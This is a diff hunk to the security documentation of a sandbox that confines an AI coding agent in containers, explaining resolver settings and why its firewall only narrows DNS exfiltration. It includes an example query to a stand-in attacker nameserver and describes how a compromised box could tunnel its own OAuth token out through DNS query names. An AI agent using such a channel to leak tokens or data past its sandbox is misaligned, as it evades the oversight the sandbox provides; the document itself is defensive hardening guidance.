@@ -342,7 +342,11 @@ never *here is an older image you are about to mistake for the new one*.
   narrows, and does not close, DNS exfiltration: the agent can no longer point queries at
   a server it chooses (`dig @attacker-ns …`), but data can still be tunnelled as query
   *names* through your legitimate resolver to a hostile authoritative server. No resolver
-  allowlist can prevent that. Treat DNS as a low-bandwidth channel that remains open — and
+  allowlist can prevent that. "Configured" means configured by the *host*: when the host's
+  only resolver is loopback, podman and docker append Google Public DNS as a fallback, so
+  the launcher points podman boxes at the network stack's forwarder to your host resolver
+  (`--dns`), and the firewall never pins a public resolver the host itself doesn't list
+  (`AIRLOCK_DNS` overrides both; see `lib/host-dns.sh`). Treat DNS as a low-bandwidth channel that remains open — and
   note that the box's own `CLAUDE_CODE_OAUTH_TOKEN` is in scope for it: a compromised box
   can read its own token and drip it out this way. If you believe a box was compromised,
   rotate the token (`command claude setup-token` again, then re-save it). The token grants
